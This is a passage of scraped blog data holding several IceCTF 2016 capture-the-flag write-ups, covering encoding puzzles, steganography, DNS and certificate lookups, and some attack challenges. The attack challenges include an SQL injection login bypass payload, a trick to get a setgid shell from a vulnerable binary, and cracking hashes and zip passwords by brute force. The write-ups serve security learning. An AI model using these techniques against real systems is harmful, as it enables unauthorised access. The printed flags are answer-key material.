10560, Note_off_c, 0, 51, 01, 10560, Note_on_c, 0, 125, 1001, 10780, Note_off_c, 0, 125, 01, 11780, End_track0, 0, End_of_file I used the first one because I found it's was easier to parse. To get the flag, we need to the value of n into ASCII only for On/Note_on_c lines (or only Off/Note_off_c,) because each value is in double. Here's my script: 12345678910111213141516import refilename = \"blue_monday_alt.txt\"binary = \"\"text = \"\"with open(filename, 'r') as fh: for line in fh: #print(line.rstrip('\\n')) if 'On' in line: regex_result = re.compile(r'n=(.*?)\\sv=').search(line) if regex_result: text += chr(int(regex_result.group(1)))print(text) And the result: 12python3 blue_monday.pyIceCTF&#123;HAck1n9_mU5Ic_W17h_mID15_L3t5_H4vE_a_r4v3&#125;","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"IceCTF - 55 - Thor's a hacker now - Misc","slug":"IceCTF-2016-IceCTF-55-Thor-s-a-hacker-now-Misc","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.502Z","comments":true,"path":"en/IceCTF-2016-IceCTF-55-Thor-s-a-hacker-now-Misc/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-55-Thor-s-a-hacker-now-Misc/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description Thor has been staring at this for hours and he can't make any sense out of it, can you help him figure out what it is? thor.txt Solution thor.txt is an xxd dump so just reverse it to get the binary: xxd -r thor.txt &gt; thor.lz. Check what the binary looks like: 12file thor.lzthor.lz: lzip compressed data, version: 1 We'll need he lzip lib and utility to manage that: apt-get install lzip. Let's uncompress the archive: lzip -d thor.lz. Now we get an image: 12file thorthor: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=GIMP 2.8.18], progressive, precision 8, 1600x680, frames 3 Just display it: display thor. IceCTF{h3XduMp1N9_l1K3_A_r341_B14Ckh47}","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"IceCTF - 55 - Demo - Pwn","slug":"IceCTF-2016-IceCTF-55-Demo-Pwn","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.478Z","comments":true,"path":"en/IceCTF-2016-IceCTF-55-Demo-Pwn/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-55-Demo-Pwn/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description I found this awesome premium shell, but my demo version just ran out... can you help me crack it? /home/demo/ on the shell. Solution Connect to the shell provided by IceCTF. Go to /home/demo/. Our goal is to display flag.txt but it is impossible ofr the moment: 12345[ctf-578@icectf-shell-2016 /home/demo]$ cat flag.txtcat: flag.txt: Permission denied[ctf-578@icectf-shell-2016 /home/demo]$ sh$ cat /home/demo/flag.txtcat: /home/demo/flag.txt: Permission denied Display demo.c 1234567891011121314151617181920212223#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;libgen.h&gt;#include &lt;string.h&gt;void give_shell() &#123; gid_t gid = getegid(); setresgid(gid, gid, gid); system(&quot;/bin/sh&quot;);&#125;int main(int argc, char *argv[]) &#123; if(strncmp(basename(getenv(&quot;_&quot;)), &quot;icesh&quot;, 6) == 0)&#123; give_shell(); &#125; else &#123; printf(&quot;I&apos;m sorry, your free trial has ended.\\n&quot;); &#125; return 0;&#125; To call give_shell() we have to bypass the if statement. We need the _ environment variable to be _=icesh. But our zsh shell don't allow us to change: _ is read-only and we can't make it writable. 1234[ctf-578@icectf-shell-2016 /home/demo]$ export \\_=iceshzsh: read-only variable: _[ctf-578@icectf-shell-2016 /home/demo]$ typeset +rx \\_=iceshtypeset: _: can&apos;t change type of a special parameter _ contain the name of the last command but launching icesh and then ./demo doesn't work in this environment because the last command is ./demo so _=./demo. As give_shell() will give us a /bin/sh, let's try with it. Start a /bin/sh. With /bin/sh, _ contain the last command before last one, so running icesh and then ./demo will work: _=icesh. So that launch give_shell() and give a /bin/sh enhanced with special gid instead of having I'm sorry, your free trial has ended. printed. With this empowered shell we can display the flag.txt file: 12$ cat /home/demo/flag.txtIceCTF&#123;wH0_WoU1d_3vr_7Ru5t_4rgV&#125;","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://rawsec.ml/tags/pwn/"}]},{"title":"IceCTF - 50 - Vape Nation - Stego","slug":"IceCTF-2016-IceCTF-50-Vape-Nation-Stego","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.438Z","comments":true,"path":"en/IceCTF-2016-IceCTF-50-Vape-Nation-Stego/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-50-Vape-Nation-Stego/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description Go Green! vape_nation.png Solution Open vape_nation.png with StegSolve. Description said Go Green so just do it! Green plane 0 contain the flag: IceCTF{420_CuR35_c4NCEr}.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"stegano","slug":"stegano","permalink":"https://rawsec.ml/tags/stegano/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"IceCTF - 15 - All your Base are belong to us - Misc","slug":"IceCTF-2016-IceCTF-15-All-your-Base-are-belong-to-us-Misc","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.455Z","comments":true,"path":"en/IceCTF-2016-IceCTF-15-All-your-Base-are-belong-to-us-Misc/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-15-All-your-Base-are-belong-to-us-Misc/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description What a mess... we got a raw flag but now what do we do... flag.txt Solution Look at the file: 1234567cat flag.txt01001001 01100011 01100101 01000011 01010100 01000110 01111011 01100001 01101100 00110001 0101111101101101 01111001 01011111 01100010 01100001 01110011 01100101 01110011 01011111 01100001 0111001001100101 01011111 01111001 01101111 01110101 01110010 01110011 01011111 01100001 01101110 0110010001011111 01100001 01101100 01101100 01011111 01111001 00110000 01110101 01110010 01011111 0110001001100001 01110011 01100101 01110011 01011111 01100001 01110010 01100101 01011111 01101101 0110100101101110 01100101 01111101 It's binary, so convert it to ASCII (with a python script): 1234567with open(\"flag.txt\", \"r\") as fh: data = fh.read() bindata = \"\".join(data.split()) intdata = int(bindata, 2) strdata = intdata.to_bytes((intdata.bit_length() + 7) // 8, 'big').decode() print(strdata) We get the flag: IceCTF{al1_my_bases_are_yours_and_all_y0ur_bases_are_mine}.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"IceCTF - 50 - Flag Storage - Web","slug":"IceCTF-2016-IceCTF-50-Flag-Storage-Web","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.502Z","comments":true,"path":"en/IceCTF-2016-IceCTF-50-Flag-Storage-Web/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-50-Flag-Storage-Web/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description What a cheat, I was promised a flag and I can't even log in. Can you get in for me? flagstorage.vuln.icec.tf. They seem to hash their passwords, but I think the problem is somehow related to this. Solution Look at the source code: 123456789101112&lt;script&gt;$(function()&#123; var updatePassword = function(e)&#123; // hash client side for better security, never leak the pw over the wire var sha = new jsSHA(\"SHA-256\", \"TEXT\"); sha.update($(this).val()); $(\"#password\").val(sha.getHash(\"HEX\")); &#125;; $(\"#password_plain\").on(\"change\", updatePassword); $(\"#form\").on(\"submit\", updatePassword);&#125;);&lt;/script&gt; Script will send our password hashed on the network instead of plain text. Login with random credentials. Open your browser network analyser and see the POST params: username and password_plain that you filled + password containing e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855. e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 is the SHA256 hash of the null string according to this or if you try with https://crackstation.net/. Description of the challenge tell us it's an SQLi so may be we need to inject username and let password_plain null so our hashed password will correspond to the hash we found. Try a classic username: ' OR 1=1 # and null password instead of random password. We get the flag: IceCTF{why_would_you_even_do_anything_client_side}.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"IceCTF - 45 - Toke - Web","slug":"IceCTF-2016-IceCTF-45-Toke-Web","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.475Z","comments":true,"path":"en/IceCTF-2016-IceCTF-45-Toke-Web/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-45-Toke-Web/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description I have a feeling they were pretty high when they made this website... Solution Register a user an login with it. With your browser network analyser loot at cookies in response header of the HTTP request: Set-Cookie: jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoiSWNlQ1RGe2pXN190MEszbnNfNFJlX25PX3AxNENFX2ZPUl81M0NyRTdTfSIsInVzZXIiOiJhemEifQ.Zfl286kFvhPrNJG-dtoTjbPU7OxlUdTW_XKEL679uU0;. JWT stands for JSON Web Tokens and is composed of 3 parts: Part1: Header, is base64 encoded, show hash algorithm. Part2: Payload, base64 encoded, content. Part3: Signature, signature, concatenation of header + content and then encoded with the hash algorithm contained in the header. So eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoiSWNlQ1RGe2pXN190MEszbnNfNFJlX25PX3AxNENFX2ZPUl81M0NyRTdTfSIsInVzZXIiOiJhemEifQ.Zfl286kFvhPrNJG-dtoTjbPU7OxlUdTW_XKEL679uU0 match with header.payload.signature. So we get: 12345printf &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&quot; | base64 -d&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;printf &quot;eyJmbGFnIjoiSWNlQ1RGe2pXN190MEszbnNfNFJlX25PX3AxNENFX2ZPUl81M0NyRTdTfSIsInVzZXIiOiJhemEifQ&quot; | base64 -d&#123;&quot;flag&quot;:&quot;IceCTF&#123;jW7_t0K3ns_4Re_nO_p14CE_fOR_53CrE7S&#125;&quot;,&quot;user&quot;:&quot;aza&quot;&#125; An introduction to JSON Web Tokens is available here.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"IceCTF - 70 - Kitty - Web","slug":"IceCTF-2016-IceCTF-70-Kitty-Web","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.502Z","comments":true,"path":"en/IceCTF-2016-IceCTF-70-Kitty-Web/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-70-Kitty-Web/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description They managed to secure their website this time and moved the hashing to the server :(. We managed to leak this hash of the admin's password though! c7e83c01ed3ef54812673569b2d79c4e1f6554ffeb27706e98c067de9ab12d1a. Can you get the flag? kitty.vuln.icec.tf Solution Try to identify the hash: 12345678910111213141516171819202122232425262728293031323334353637383940414243# hashid &quot;c7e83c01ed3ef54812673569b2d79c4e1f6554ffeb27706e98c067de9ab12d1a&quot;Analyzing &apos;c7e83c01ed3ef54812673569b2d79c4e1f6554ffeb27706e98c067de9ab12d1a&apos;[+] Snefru-256[+] SHA-256[+] RIPEMD-256[+] Haval-256[+] GOST R 34.11-94[+] GOST CryptoPro S-Box[+] SHA3-256[+] Skein-256[+] Skein-512(256)# hash-identifier ######################################################################### # __ __ __ ______ _____ # # /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ `\\ # # \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\/_/\\ \\/ \\ \\ \\/\\ \\ # # \\ \\ _ \\ /&apos;__`\\ / ,__\\ \\ \\ _ `\\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ # # \\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/ # # \\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.1 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # ######################################################################### ------------------------------------------------------------------------- HASH: c7e83c01ed3ef54812673569b2d79c4e1f6554ffeb27706e98c067de9ab12d1aPossible Hashs:[+] SHA-256[+] Haval-256Least Possible Hashs:[+] GOST R 34.11-94[+] RipeMD-256[+] SNEFRU-256[+] SHA-256(HMAC)[+] Haval-256(HMAC)[+] RipeMD-256(HMAC)[+] SNEFRU-256(HMAC)[+] SHA-256(md5($pass))[+] SHA-256(sha1($pass)) That's most probably a SHA-256 hash. Try an online service to get the decoded password: Vo83*. Log in with Username: admin and Password: Vo83*. Flag: IceCTF{i_guess_hashing_isnt_everything_in_this_world}.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"IceCTF - 65 - R.I.P Transmission - Forensics","slug":"IceCTF-2016-IceCTF-65-RIP-Transmission-Forensics","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.488Z","comments":true,"path":"en/IceCTF-2016-IceCTF-65-RIP-Transmission-Forensics/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-65-RIP-Transmission-Forensics/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description [This][this] seems to be recieving some sort of transmission. Our experts have been working around the clock trying and figure out what the hell it means with no hope of getting to the bottom of it. You're our only hope. [this]:https://play.icec.tf/problem-static/rip_2067f9686b4d07eea2cac19b9c6588b2abac16500135901ce8781e4ccc262446 Solution Check file type: 12file riprip: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=9fd51896db8e1b47260951e8f6ca7d6023ce9ae6, not stripped Execute it: http://asciinema.org/a/276ngyyh05z80luxnqbyy95mq That's defintly not what we're looking for but only a lapse in concentration. Check what is hidden in this binary: 123456789101112131415binwalk ripDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 ELF, 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux)993400 0xF2878 Unix path: /usr/lib/locale/locale-archive1014524 0xF7AFC Unix path: /proc/sys/vm/overcommit_memory1024257 0xFA101 Unix path: /proc/sys/kernel/rtsig-max1025342 0xFA53E Unix path: /sysdeps/unix/sysv/linux/getcwd.c1027000 0xFABB8 Unix path: /proc/sys/kernel/osrelease1093862 0x10B0E6 Unix path: /nptl/sysdeps/unix/sysv/linux/i386/../fork.c1097017 0x10BD39 ELF, 32-bit LSB no file type, (SYSV)1100142 0x10C96E Unix path: /sysdeps/unix/sysv/linux/dl-origin.c1323949 0x1433AD Zip archive data, encrypted at least v2.0 to extract, compressed size: 112199, uncompressed size: 112190, name: rip.jpg1436306 0x15EA92 End of Zip archive We can see there is a zip with encrypted data (protected by password). Firstly we can extract this zip from the binary: 123456789101112131415161718192021222324252627foremost -t zip -i rip -T -vForemost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick MikusAudit FileForemost started at Sat Aug 20 23:01:53 2016Invocation: foremost -t zip -i rip -T -vOutput directory: /root/CTF/IceCTF/2016/65-RIP_Transmission-Forensics/output_Sat_Aug_20_23_01_53_2016Configuration file: /etc/foremost.confProcessing: rip|------------------------------------------------------------------File: ripStart: Sat Aug 20 23:01:53 2016Length: 1 MB (1698648 bytes)Num Name (bs=512) Size File Offset Commentfoundat=rip.jpgUT0: 00002585.zip 109 KB 1323949 *|Finish: Sat Aug 20 23:01:53 20161 FILES EXTRACTEDzip:= 1------------------------------------------------------------------Foremost finished at Sat Aug 20 23:01:53 2016 Secondly we can bruteforce the password with patator, I first tried with 500-worst-passwords dict and then I was successful with john dict: 1234567patator unzip_pass zipfile=output_Sat_Aug_20_23_01_53_2016/zip/00002585.zip password=FILE0 0=john.txt -x ignore:code!=023:22:46 patator INFO - Starting Patator v0.7-beta (https://github.com/lanjelot/patator) at 2016-08-20 23:22 CEST23:22:46 patator INFO - 23:22:46 patator INFO - code size time | candidate | num | mesg23:22:46 patator INFO - -----------------------------------------------------------------------------23:22:49 patator INFO - 0 142 0.020 | bunny | 966 | No errors detected in compressed data of /root/CTF/IceCTF/2016/65-RIP_Transmission-Forensics/output_Sat_Aug_20_23_01_53_2016/zip/00002585.zip.23:22:56 patator INFO - Hits/Done/Skip/Fail/Size: 1/3107/0/0/3107, Avg: 321 r/s, Time: 0h 0m 9s Now we have just to unzip output_Sat_Aug_20_23_01_53_2016/zip/00002585.zip with bunny as password. And display output_Sat_Aug_20_23_01_53_2016/zip/rip.jpg to get the flag: IceCTF{1_Lik3_7o_r1P_4nD_diP_411_7He_ziP5}","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"IceCTF - 45 - Time Traveler - Forensics","slug":"IceCTF-2016-IceCTF-45-Time-Traveler-Forencics","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.475Z","comments":true,"path":"en/IceCTF-2016-IceCTF-45-Time-Traveler-Forencics/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-45-Time-Traveler-Forencics/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description I can assure you that the flag was on this website at some point in time. Solution Use the WaybackMachine of Internet Archive. Enter the URL http://time-traveler.icec.tf/. Select the save point and get the flag: IceCTF{Th3y'11_n3v4r_f1|\\|d_m4h_fl3g_1n_th3_p45t}. Similar challenge: ABCTF - 50 - Archive Me - Reconaissance POV: I think it's more a Reconaissance challenge than a Forensics one. But you know challenge classification in CTF...","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"IceCTF - 45 - Hidden in Plain Sight - ReverseEngineering","slug":"IceCTF-2016-IceCTF-45-Hidden-in-Plain-Sight-ReverseEngineering","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.502Z","comments":true,"path":"en/IceCTF-2016-IceCTF-45-Hidden-in-Plain-Sight-ReverseEngineering/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-45-Hidden-in-Plain-Sight-ReverseEngineering/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description Make sure you take a real close look at it, it should be right there! /home/plain_sight/ or download it here Solution Open this binary with an hex editor (ex: ht, xxd, hexeditor, bless, wxHexEditor by preference order) 1234500000510: ec0c 50e8 38fe ffff 83c4 10b0 49b0 63b0 ..P.8.......I.c.00000520: 65b0 43b0 54b0 46b0 7bb0 6cb0 6fb0 6fb0 e.C.T.F.&#123;.l.o.o.00000530: 6bb0 5fb0 6db0 6fb0 6db0 5fb0 49b0 5fb0 k._.m.o.m._.I._.00000540: 66b0 6fb0 75b0 6eb0 64b0 5fb0 69b0 74b0 f.o.u.n.d._.i.t.00000550: 7dc7 45f4 0000 0000 eb2f 83ec 0c6a 01e8 &#125;.E....../...j..","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"reverse","slug":"reverse","permalink":"https://rawsec.ml/tags/reverse/"}]},{"title":"IceCTF - 40 - Search - Misc","slug":"IceCTF-2016-IceCTF-40-Search-Misc","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.502Z","comments":true,"path":"en/IceCTF-2016-IceCTF-40-Search-Misc/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-40-Search-Misc/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description There's something about this domain... search.icec.tf, I don't see anything, but maybe its all about the conTEXT. Solution Default behaviour of main dns lookup utilities (like nslookup or dig) is to look for A type record. But we want to look at TXT type record. So instead of using dig search.icec.tf/ (eq. dig -t A search.icec.tf/), we'll use dig -t TXT search.icec.tf/. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162┌─[root@parrot]─[~/CTF/IceCTF/2016]└──╼ #dig -t A search.icec.tf; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Debian &lt;&lt;&gt;&gt; -t A search.icec.tf;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 21856;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;search.icec.tf. IN A;; AUTHORITY SECTION:icec.tf. 300 IN SOA bob.ns.cloudflare.com. dns.cloudflare.com. 2022260330 10000 2400 604800 3600;; Query time: 88 msec;; SERVER: 127.0.0.1#53(127.0.0.1);; WHEN: Wed Aug 17 22:45:54 CEST 2016;; MSG SIZE rcvd: 104┌─[root@parrot]─[~/CTF/IceCTF/2016]└──╼ #dig search.icec.tf; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Debian &lt;&lt;&gt;&gt; search.icec.tf;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 41552;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;search.icec.tf. IN A;; Query time: 0 msec;; SERVER: 127.0.0.1#53(127.0.0.1);; WHEN: Wed Aug 17 22:46:07 CEST 2016;; MSG SIZE rcvd: 43┌─[root@parrot]─[~/CTF/IceCTF/2016]└──╼ #dig -t TXT search.icec.tf; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Debian &lt;&lt;&gt;&gt; -t TXT search.icec.tf;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 35890;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;search.icec.tf. IN TXT;; ANSWER SECTION:search.icec.tf. 300 IN TXT &quot;IceCTF&#123;flag5_all_0v3r_the_Plac3&#125;&quot;;; Query time: 61 msec;; SERVER: 127.0.0.1#53(127.0.0.1);; WHEN: Wed Aug 17 22:46:16 CEST 2016;; MSG SIZE rcvd: 88 For more details about DNS record types, see the List of DNS record types.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"IceCTF - 40 - Complacent - Reconnaissance","slug":"IceCTF-2016-IceCTF-40-Complacent-Reconnaissance","date":"2016-08-24T22:00:00.000Z","updated":"2017-02-07T18:23:37.502Z","comments":true,"path":"en/IceCTF-2016-IceCTF-40-Complacent-Reconnaissance/","link":"","permalink":"https://rawsec.ml/en/IceCTF-2016-IceCTF-40-Complacent-Reconnaissance/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link Description These silly bankers have gotten pretty complacent with their self signed SSL certificate. I wonder if there's anything in there. complacent.vuln.icec.tf Solution With Mozilla Firefox (method 1): Go to https://complacent.vuln.icec.tf/. Accept security exceptions. Open the Inspect Element pannel. Go to the Network tab and reload. Select the main GET request. Select the Security tab. The Certificate: Organizational Unit (OU) is Flag: IceCTF{this_1nformation_wasnt_h1dd3n_at_a11}. or With Mozilla Firefox (method 2): Go to https://complacent.vuln.icec.tf/. Accept security exceptions. Click on the lock next to the URL bar. Then click on the arrow at the right of the little pop-up. Click on More Information button. Go to the Security tab. Click on the View Certificate button. Look at infos in the General tab. The Certificate: Organizational Unit (OU) is Flag: IceCTF{this_1nformation_wasnt_h1dd3n_at_a11}. PS: there is a lot of other 